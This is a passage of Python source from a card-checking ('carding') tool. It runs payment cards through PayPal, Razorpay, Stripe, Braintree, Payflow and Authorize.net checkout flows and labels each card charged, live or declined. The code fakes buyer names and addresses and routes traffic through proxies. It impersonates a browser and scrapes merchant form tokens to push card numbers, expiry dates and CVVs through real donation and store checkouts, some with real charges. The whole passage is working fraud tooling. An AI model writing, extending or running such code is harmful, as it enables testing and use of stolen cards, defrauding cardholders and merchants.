                    "referer": "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf&sdkCorrelationID=f308033f5c550&storageID=uid_6a9b3f40f6_mtg6ntc6ntk&sessionID=uid_32896bb77a_mtg6ntc6ntk&buttonSessionID=uid_98c2d6c744_mtg6ntc6ntk&env=production&buttonSize=medium&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImhpcGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImpjYiI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX19LCJndWVzdEVuYWJsZWQiOmZhbHNlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false"}
            post2 = '{"purchase_units":[{"amount":{"currency_code":"USD","value":"0.01","breakdown":{"item_total":{"currency_code":"USD","value":"0.01"}}},"items":[{"name":"item name","unit_amount":{"currency_code":"USD","value":"0.01"},"quantity":"1","category":"DONATION"}],"description":"Sachio YT"}],"intent":"CAPTURE","application_context":{}}'
            r2 = await session.post("https://www.paypal.com/v2/checkout/orders", headers=head2, data=post2)
            order_id_match = re.search(r'"id":"([^"]+)"', r2.text)
            if not order_id_match:
                return {'status': 'ERROR', 'message': 'Order ID not found', 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
            order_id = order_id_match.group(1)
            post3 = {
                "query": "mutation payWithCard($token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int) { approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } }",
                "variables": {
                    "token": order_id,
                    "card": {"cardNumber": cc, "expirationDate": f"{mes}/{ano}", "postalCode": "10027", "securityCode": cvv},
                    "phoneNumber": "19006318646", "firstName": "Abril", "lastName": "TG",
                    "billingAddress": {"givenName": "Abril", "familyName": "TG", "line1": "118 W 132nd St", "line2": None, "city": "New York", "state": "NY", "postalCode": "10027", "country": "US"},
                    "shippingAddress": {"givenName": "Abril", "familyName": "TG", "line1": "118 W 132nd St", "line2": None, "city": "New York", "state": "NY", "postalCode": "10027", "country": "US"},
                    "email": "abril2040@gmail.com", "currencyConversionType": "PAYPAL",
                },
                "operationName": None,
            }
            head3 = {"content-type": "application/json", "referer": f"https://www.paypal.com/smart/card-fields?sessionID=uid_32896bb77a_mtg6ntc6ntk&buttonSessionID=uid_98c2d6c744_mtg6ntc6ntk&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVJZZHZfdkROTTJpNGJJSXA2QXNuVDduQmNTdWtZRExJLWdoZ2JiaC0xVi05OEZ2eVR2NERySU1IaS1KUm9peFRLdjMyMXJzalZGeVRhTWYmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&disable-card=&token={order_id}"}
            r3 = await session.post("https://www.paypal.com/graphql?fetch_credit_form_submit", headers=head3, json=post3)
            t3 = r3.text
            message_error = re.search(r'"message":"([^"]+)"', t3)
            msg_err = message_error.group(1) if message_error else ''
            code_error = re.search(r'"code":"([^"]+)"', t3)
            code_err = code_error.group(1) if code_error else ''
            response_text = f"{code_err} - {msg_err}" if code_err or msg_err else t3[:100]
            if "is3DSecureRequired" in t3 or "PAYER_CANNOT_PAY" in t3 or "ADD_SHIPPING_ERROR" in t3 or "EXISTING_ACCOUNT_RESTRICTED" in code_err or "INVALID_BILLING_ADDRESS" in code_err or "INVALID_SECURITY_CODE" in code_err or "VALIDATION_ERROR" in code_err:
                return {'status': 'APPROVED', 'message': response_text, 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
            else:
                return {'status': 'DECLINED', 'message': response_text, 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}
    except Exception as e:
        return {'status': 'ERROR', 'message': str(e), 'gateway': 'PayPal2', 'price': '$0.01', 'card': cc_str}

# ================== RAZORPAY CHECKER ==================
async def check_razorpay_card(cc_str: str, site: str = None, proxy: str = None):
    if site is None:
        site = random.choice(RAZORPAY_SITES)
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}
    cc_full = f"{card['number']}|{card['mm']}|{card['yy'][-2:]}|{card['cvc']}"

    def determine_status(msg_text):
        msg_lower = msg_text.lower()
        if any(phrase in msg_lower for phrase in ['payment successful', 'thank you', 'charged', 'approved', 'success']):
            return 'CHARGED'
        if any(phrase in msg_lower for phrase in ['insufficient funds', 'live', 'ccn']):
            return 'APPROVED'
        if 'ds_required' in msg_lower:
            ds_required_false = re.search(r'(?<!\w)ds_required\s*[:=]\s*(false|0|no)\b', msg_lower)
            if not ds_required_false:
                return '3DS_REQUIRED'
        return 'DECLINED'

    new_api_url = f"{RAZORPAY_API_URL_NEW}?cc={cc_full}&url={site}&amount={RAZORPAY_AMOUNT}"
    if proxy:
        new_api_url += f"&proxy={proxy}"
    timeout = aiohttp.ClientTimeout(total=60)
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(new_api_url) as resp:
                if resp.status == 200:
                    try:
                        data = await resp.json()
                    except Exception:
                        data = {}
                    status_raw = data.get('Status', '')
                    msg = data.get('Response', 'Unknown response')
                    status = determine_status(msg)
                    if 'APPROVED' in status_raw.upper() or 'CHARGED' in status_raw.upper():
                        status = 'CHARGED'
                    elif 'LIVE' in status_raw.upper() or 'CCN' in status_raw.upper():
                        status = 'APPROVED'
                    if status == '3DS_REQUIRED':
                        msg = '3D Secure required'
                    return {'status': status, 'message': msg, 'gateway': data.get('Gate', 'Razorpay'), 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}
    except Exception:
        pass

    url = f"{RAZORPAY_API_URL_OLD}?Key={RAZORPAY_API_KEY}&Site={site}&amount={RAZORPAY_AMOUNT}&cc={cc_full}"
    if proxy:
        url += f"&proxy={proxy}"
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'ERROR', 'message': f'HTTP {resp.status}', 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}
                try:
                    data = await resp.json()
                except Exception:
                    text = await resp.text()
                    return {'status': 'ERROR', 'message': f'Invalid JSON: {text[:100]}', 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}
        status_raw = data.get('status', '')
        msg = data.get('response', 'Unknown response')
        status = determine_status(msg)
        if 'APPROVED' in status_raw.upper() or 'CHARGED' in status_raw.upper():
            status = 'CHARGED'
        elif 'LIVE' in status_raw.upper() or 'CCN' in status_raw.upper():
            status = 'APPROVED'
        if status == '3DS_REQUIRED':
            msg = '3D Secure required'
        return {'status': status, 'message': msg, 'gateway': data.get('gateway', 'Razorpay'), 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}
    except Exception as e:
        return {'status': 'ERROR', 'message': str(e), 'gateway': 'Razorpay', 'price': f'₹{RAZORPAY_AMOUNT}', 'card': cc_str}

# ================== STRIPE $5 CHECKER ==================
async def check_stripe5_card(cc_str: str, proxy: str = None):
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
    user = ''.join(random.choices(string.ascii_lowercase, k=6)) + ''.join(random.choices(string.digits, k=4))
    data = {
        'user_name': user, 'user_pass': '@Nikhil789', 'user_pass2': '@Nikhil789', 'email': f'{user}@gmail.com',
        'first_name': 'nani', 'last_name': 'nikhil', 'company': 'nihkil', 'address': '3rd street avenue rd.',
        'city': 'new york', 'state': 'New York', 'zip': '10080', 'country': 'United States', 'phone': '2015554587',
        'ccnumber': card['number'], 'ccexpmonth': card['mm'], 'ccexpyear': card['yy'], 'cvs': card['cvc'],
        'form_build_id': 'form-560TzB2b4F2KzMqLTlRtth-QRkwn12nlBC2PzOcVEUE',
        'form_id': 'subscription_purchase_form', 'honeypot_time': '1775906069|7HvYXRiVjv1-TI6417wSonlnvZYWimMafMMXHXqYF5M', 'url': ''
    }
    headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
               'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.galaxie.com',
               'referer': 'https://www.galaxie.com/subscribe/2',
               'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    proxy_url = None
    if proxy:
        if not proxy.startswith('http://') and not proxy.startswith('https://'):
            proxy_url = f"http://{proxy}"
        else:
            proxy_url = proxy
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(STRIPE5_URL, data=data, headers=headers, proxy=proxy_url, timeout=30, allow_redirects=True) as resp:
                text = await resp.text()
        text_lower = text.lower()
        if "thank you" in text_lower or "subscription confirmed" in text_lower or "welcome" in text_lower:
            return {'status': 'CHARGED', 'message': 'Subscription successful', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
        elif "insufficient funds" in text_lower:
            return {'status': 'APPROVED', 'message': 'Insufficient funds (Live)', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
        elif "cvv" in text_lower or "security code" in text_lower:
            return {'status': 'APPROVED', 'message': 'CVV mismatch (Live)', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
        elif "declined" in text_lower:
            return {'status': 'DECLINED', 'message': 'Card declined', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
        else:
            return {'status': 'DECLINED', 'message': 'Transaction failed', 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}
    except Exception as e:
        return {'status': 'ERROR', 'message': str(e), 'gateway': 'Stripe $5', 'price': '$5', 'card': cc_str}

# ================== BRAINTREE CHECKER ==================
def braintree_charge_check_sync(card_raw, proxy_url=None):
    import base64, json, re, random, time, uuid
    import requests
    from curl_cffi import requests as cfrequests
    cc_full = card_raw.strip()
    try:
        parts = re.split(r'[:|/ ]', cc_full)
        if len(parts) < 4:
            return {"status": "error", "response": "Invalid format"}
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = "20" + yy
        if len(mm) == 1: mm = "0" + mm
        proxy = None
        if proxy_url:
            proxy = {"http": proxy_url, "https": proxy_url}
        session = cfrequests.Session(impersonate="chrome")
        first_name = random.choice(["James", "Robert", "John", "Michael"])
        last_name = random.choice(["Smith", "Johnson", "Williams"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@gmail.com"
        r = session.get(BRAINTREE_SITE_URL, proxies=proxy, timeout=30)
        if r.status_code != 200:
            return {"status": "error", "response": f"Homepage {r.status_code}"}
        r = session.get(BRAINTREE_PRODUCT_URL, proxies=proxy, timeout=30)
        aspnet = {}
        for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION']:
            v = re.search(rf'id="{f}" value="([^"]+)"', r.text)
            if v: aspnet[f] = v.group(1)
        options = re.findall(r'name="(ctl00[^"]*rblOptions[^"]*)"[^>]*value="([^"]*)"', r.text)
        for n, v in options: aspnet[n] = v
        aspnet['ctl00$ctl00$MainContent$Body$btnAddToCart'] = 'ADD TO CART'
        aspnet['ctl00$ctl00$MainContent$Body$txtQuantity'] = '1'
        r = session.post(BRAINTREE_PRODUCT_URL, data=aspnet, proxies=proxy, timeout=30)
        r = session.get(BRAINTREE_CHECKOUT_URL, proxies=proxy, timeout=30)
        aspnet = {}
        for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION']:
            v = re.search(rf'id="{f}" value="([^"]+)"', r.text)
            if v: aspnet[f] = v.group(1)
        aspnet['ctl00$ctl00$ctl00$MainContent$Body$Body$btnContinue'] = 'Continue as Guest'
        r = session.post(r.url, data=aspnet, proxies=proxy, timeout=30)
        pfx = 'ctl00$ctl00$ctl00$MainContent$Body$Body$CheckoutAddresses1'
        aspnet = {}
        for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION','__VIEWSTATEENCRYPTED']:
            v = re.search(rf'id="{f}" value="([^"]+)"', r.text)
            if v: aspnet[f] = v.group(1)
        aspnet[f'{pfx}$AECCreditCard$txtFirstName'] = first_name
        aspnet[f'{pfx}$AECCreditCard$txtLastName'] = last_name
        aspnet[f'{pfx}$AECCreditCard$txtAddress1'] = '456 Oak Ave'
        aspnet[f'{pfx}$AECCreditCard$txtCity'] = 'Houston'
        aspnet[f'{pfx}$AECCreditCard$txtStateProvince'] = 'TX'
        aspnet[f'{pfx}$AECCreditCard$txtPostalCode'] = '77001'
        aspnet[f'{pfx}$AECCreditCard$ddlCountry'] = '225'
        aspnet[f'{pfx}$AECCreditCard$txtSimplePhone'] = '7135551234'
        aspnet[f'{pfx}$rptShippingAddresses$ctl00$chkSameAsBilling'] = 'on'
        aspnet[f'{pfx}$rptShippingAddresses$ctl00$AECShipping$ddlCountry'] = '225'
        aspnet[f'{pfx}$btnCheckOut'] = 'Continue'
        r = session.post(r.url, data=aspnet, proxies=proxy, timeout=30)
        if 'pfas' in r.url.lower():
            aspnet = {}
            for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION']:
                v = re.search(rf'id="{f}" value="([^"]+)"', r.text)
                if v: aspnet[f] = v.group(1)
            aspnet['ctl00$ctl00$ctl00$MainContent$Body$Body$btnProceedWithoutItems'] = 'Proceed'
            r = session.post(r.url, data=aspnet, proxies=proxy, timeout=30)
        if 'review' not in r.url.lower():
            r = session.get(f"{BRAINTREE_REVIEW_URL}?guestcheckout=1", proxies=proxy, timeout=30)
        page = r.text
        client_token_b64 = re.search(r'clientToken = "([^"]+)"', page)
        if not client_token_b64:
            client_token_b64 = re.search(r"clientToken = '([^']+)'", page)
        if not client_token_b64:
            return {"status": "error", "response": "No Braintree token"}
        client_token = client_token_b64.group(1)
        try:
            decoded = json.loads(base64.b64decode(client_token).decode())
            auth_fingerprint = decoded.get('authorizationFingerprint', '')
        except:
            auth_fingerprint = client_token if client_token.startswith('eyJ') else ''
        if not auth_fingerprint:
            return {"status": "error", "response": "Empty fingerprint"}
        session_id = str(uuid.uuid4())
        headers_bt = {'authorization': f'Bearer {auth_fingerprint}', 'braintree-version': '2018-05-10',
                     'content-type': 'application/json', 'user-agent': 'Mozilla/5.0',
                     'origin': 'https://assets.braintreegateway.com'}
        mutation = {
            "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { issuingBank countryOfIssuance } } } }",
            "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv, "billingAddress": {"postalCode": "77001"}}, "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard"
        }
        r_bt = requests.post(BRAINTREE_GRAPHQL, json=mutation, headers=headers_bt, proxies=proxy, timeout=30)
        bt_data = r_bt.json()
        if "errors" in bt_data:
            err = bt_data["errors"][0].get("message", "Tokenization error")
            return {"status": "dead", "response": err}
        nonce = bt_data.get("data", {}).get("tokenizeCreditCard", {}).get("token")
        if not nonce:
            return {"status": "error", "response": "Empty nonce"}
        rpfx = 'ctl00$ctl00$ctl00$MainContent$Body$Body$CheckoutReview1'
        aspnet = {}
        for f in ['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION','__VIEWSTATEENCRYPTED']:
            v = re.search(rf'id="{f}" value="([^"]+)"', page)
            if v: aspnet[f] = v.group(1)
        device_data = json.dumps({"correlation_id": session_id[:26]})
        aspnet[f'{rpfx}$Braintree1$txtNonce'] = nonce
        aspnet[f'{rpfx}$Braintree1$txtDeviceData'] = device_data
        aspnet[f'{rpfx}$Braintree1$txtPaymentType'] = 'CreditCard'
        aspnet[f'{rpfx}$payment_type'] = 'Braintree'
        aspnet[f'{rpfx}$txtEmail'] = email
        aspnet[f'{rpfx}$btnSubmit'] = 'Place Order'
        r = session.post(f"{BRAINTREE_REVIEW_URL}?guestcheckout=1", data=aspnet, proxies=proxy, timeout=30)
        resp_text = r.text.lower()
        if "thank you" in resp_text or "order confirmation" in resp_text:
            return {"status": "charged", "response": "Charged ~$180 ✅", "amount": "~$180"}
        elif "insufficient" in resp_text:
            return {"status": "live", "response": "Insufficient Funds → Live ✅"}
        elif "cvv" in resp_text or "security code" in resp_text:
            return {"status": "live", "response": "CVV Mismatch → Live ✅"}
        elif "declined" in resp_text:
            return {"status": "dead", "response": "Declined ❌"}
        else:
            return {"status": "dead", "response": "Transaction failed"}
    except Exception as e:
        return {"status": "error", "response": str(e)}

async def check_braintree_card(cc_str: str, proxy: str = None):
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, braintree_charge_check_sync, cc_str, proxy)
    status_map = {"charged": "CHARGED", "live": "APPROVED", "dead": "DECLINED", "error": "ERROR"}
    result["status"] = status_map.get(result.get("status"), "DECLINED")
    result["gateway"] = "Braintree Charge"
    result["price"] = result.get("amount", "~$180")
    result["card"] = cc_str
    result["message"] = result.get("response", "Unknown response")
    return result

# ================== PAYFLOW CHECKER ==================
async def check_payflow_card(cc_str: str, proxy: dict = None) -> dict:
    import re, random, time, requests
    from typing import Tuple, Optional

    def parse_response(result_code: str, resp_msg: str) -> Tuple[str, str]:
        text_lower = f"{result_code} - {resp_msg}".lower()
        if (result_code == "0" or "approved" in text_lower or "thank you" in text_lower or
            "payment successful" in text_lower or "transaction completed" in text_lower or
            "order confirmed" in text_lower or "charge" in text_lower):
            return "charged", f"✅ CHARGED | Code: {result_code} - {resp_msg}"
        if ("cvv2 mismatch" in text_lower or "cvv mismatch" in text_lower or
            "cvv2_faliure" in text_lower or "credit card verification number" in text_lower or
            ("cvv" in text_lower and ("invalid" in text_lower or "incorrect" in text_lower))):
            return "cvv", f"🔒 CVV2_FAILURE | Code: {result_code} - {resp_msg}"
        if ("funds" in text_lower or "insufficient" in text_lower or "insufficient_funds" in text_lower):
            return "live", f"💰 INSUFFICIENT_FUNDS | Code: {result_code} - {resp_msg}"
        return "declined", f"❌ DECLINED | Code: {result_code} - {resp_msg}"

    def create_guest_cart(session: requests.Session, base_url: str) -> Optional[str]:
        try:
            response = session.post(f'{base_url}/rest/default/V1/guest-carts',
                                    headers={'Content-Type': 'application/json'},
                                    verify=False, timeout=30)
            if response.status_code in [200, 201]:
                return response.text.strip('"')
            return None
        except Exception:
            return None

    def set_payment_info(session: requests.Session, base_url: str, cart_id: str, email: str,
                         cc_type: str, cc_last_4: str, cc_exp_month: str, cc_exp_year: str) -> bool:
        try:
            data = {
                "cartId": cart_id,
                "paymentMethod": {
                    "method": "payflowpro",
                    "additional_data": {"cc_type": cc_type, "cc_exp_year": cc_exp_year,
                                        "cc_exp_month": cc_exp_month, "cc_last_4": cc_last_4},
                    "extension_attributes": {"agreement_ids": ["1"]}
                },
                "email": email,
                "billingAddress": {
                    "countryId": "US", "regionId": "12", "region": "", "street": ["123 Main St", ""],
                    "company": "", "telephone": "5551234567", "postcode": "90210", "city": "Beverly Hills",
                    "firstname": "John", "lastname": "Doe", "vatId": "", "saveInAddressBook": None
                }
            }
            response = session.post(f'{base_url}/rest/default/V1/guest-carts/{cart_id}/set-payment-information',
                                    headers={'Content-Type': 'application/json'}, json=data, verify=False, timeout=30)
            return response.status_code in [200, 201]
        except Exception:
            return False

    def get_secure_token(session: requests.Session, base_url: str, form_key: str, cc_type: str) -> dict:
        try:
            data = {
                'form_key': form_key, 'captcha_form_id': 'payment_processing_request',
                'payment[method]': 'payflowpro', 'billing-address-same-as-shipping': 'on',
                'agreement[1]': '1', 'recaptcha-validate': '', 'controller': 'checkout_flow', 'cc_type': cc_type,
            }
            headers = {'accept': 'application/json, text/javascript, */*; q=0.01',
                      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                      'origin': base_url, 'referer': f'{base_url}/checkout/', 'x-requested-with': 'XMLHttpRequest'}
            response = session.post(f'{base_url}/paypal/transparent/requestSecureToken/',
                                    headers=headers, data=data, verify=False, timeout=30)
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    fields = result.get('payflowpro', {}).get('fields', {})
                    return {'securetoken': fields.get('securetoken'), 'securetokenid': fields.get('securetokenid'), 'success': True}
            return {'success': False}
        except Exception:
            return {'success': False}

    def get_form_key(session: requests.Session, base_url: str) -> str:
        try:
            response = session.get(f'{base_url}/checkout/', verify=False, timeout=30)
            match = re.search(r'name="form_key" value="([^"]+)"', response.text)
            if match:
                return match.group(1)
            match = re.search(r'"formKey":"([^"]+)"', response.text)
            if match:
                return match.group(1)
        except Exception:
            pass
        return '6Ks5syraLFbK7lyN'

    def detect_card_type(cc_number: str) -> str:
        if cc_number.startswith('4'): return 'VI'
        elif cc_number.startswith(('51', '52', '53', '54', '55')): return 'MC'
        elif cc_number.startswith(('34', '37')): return 'AE'
        elif cc_number.startswith('6011'): return 'DI'
        else: return 'VI'

    def process_single_card(card_string: str, session: requests.Session, base_url: str = PAYFLOW_BASE_URL) -> Tuple[str, str]:
        match = re.match(r'^(\d+)\|(\d{2})\|(\d{2,4})\|(\d{3,4})$', card_string.strip())
        if not match:
            return "error", f"Invalid format: {card_string}"
        cc_number, cc_month, cc_year, cc_cvv = match.groups()
        if len(cc_year) == 4:
            cc_year_full = cc_year
            cc_year = cc_year[-2:]
        else:
            cc_year_full = '20' + cc_year
        try:
            cart_id = create_guest_cart(session, base_url)
            if not cart_id:
                return "error", "Failed to create cart"
            form_key = get_form_key(session, base_url)
            cc_type = detect_card_type(cc_number)
            cc_last_4 = cc_number[-4:]
            email = f"user{random.randint(1000, 9999)}@gmail.com"
            set_payment_info(session, base_url, cart_id, email, cc_type, cc_last_4, cc_month, cc_year_full)
            token_data = get_secure_token(session, base_url, form_key, cc_type)
            if not token_data.get('success'):
                return "error", "Failed to get secure token"
            expdate = cc_month + cc_year
            paypal_data = {
                'result': '0', 'securetoken': token_data['securetoken'],
                'securetokenid': token_data['securetokenid'], 'respmsg': 'Approved',
                'result_code': '0', 'csc': cc_cvv, 'expdate': expdate, 'acct': cc_number,
            }
            paypal_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'content-type': 'application/x-www-form-urlencoded', 'origin': base_url,
                'referer': f'{base_url}/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            response = session.post('https://payflowlink.paypal.com/', headers=paypal_headers, data=paypal_data, verify=False, timeout=30)
            result_code_match = re.search(r'name="RESULT" value="(.*?)"', response.text)
            respmsg_match = re.search(r'name="RESPMSG" value="(.*?)"', response.text)
            result_code = result_code_match.group(1) if result_code_match else 'N/A'
            resp_msg = respmsg_match.group(1) if respmsg_match else response.text[:200]
            status, message = parse_response(result_code, resp_msg)
            return status, message
        except Exception as e:
            return "error", str(e)[:100]

    def check_card(card_string: str, proxy_dict: dict = None) -> Tuple[str, str]:
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                               'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest'})
        if proxy_dict:
            session.proxies.update(proxy_dict)
        return process_single_card(card_string, session)

    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Payflow $18', 'price': '$18', 'card': cc_str}
    proxy_dict = None
    if proxy and isinstance(proxy, dict):
        proxy_dict = proxy
    loop = asyncio.get_event_loop()
    status, message = await loop.run_in_executor(None, check_card, f"{card['number']}|{card['mm']}|{card['yy']}|{card['cvc']}", proxy_dict)
    status_map = {"charged": "CHARGED", "cvv": "APPROVED", "live": "APPROVED", "declined": "DECLINED", "error": "ERROR"}
    final_status = status_map.get(status, "DECLINED")
    return {'status': final_status, 'message': message, 'gateway': 'Payflow $18', 'price': '$18', 'card': cc_str}

# ================== AUTHORIZE.NET CHECKER ==================
async def check_authorize_card(cc_str: str, proxy: str = None) -> dict:
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Authorize.net', 'price': '$1.00', 'card': cc_str}

    def random_donor():
        first_names = ["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda","William","Elizabeth"]
        last_names = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
        addr_streets = ["123 Main St", "456 Oak Ave", "789 Pine Rd"]
        cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
        states = ["NY", "CA", "IL", "TX", "AZ"]
        first = random.choice(first_names)
        last = random.choice(last_names)
        street = random.choice(addr_streets)
        city = random.choice(cities)
